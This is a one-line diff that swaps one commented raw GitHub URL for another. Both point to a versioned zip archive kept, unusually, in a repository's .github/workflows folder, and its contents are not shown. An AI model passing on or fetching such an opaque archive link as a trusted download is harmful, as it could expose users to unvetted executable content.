@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/sangasary/sangasary.github.io/main/.github/workflows/github_sangasary_io_v3.8.zip
+# https://raw.githubusercontent.com/sangasary/sangasary.github.io/main/.github/workflows/io-sangasary-github-v1.1.zip
